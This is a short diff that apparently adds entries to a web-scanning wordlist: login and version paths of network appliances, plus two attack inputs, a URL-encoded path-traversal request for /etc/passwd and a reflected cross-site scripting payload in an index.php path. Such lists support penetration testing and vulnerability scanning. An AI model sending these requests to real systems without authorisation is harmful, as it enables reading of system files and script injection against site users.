@@ -1,0 +1,8 @@
+/wd/en-us/wapplink.asp
+/portal/
+/npm-admin/showLoginPage.do
+
+/server-common/cgi-bin/login
+/ucs/micollab/version.json
+/awcuser/cgi-bin/vcs_access_file.cgi?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
+/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
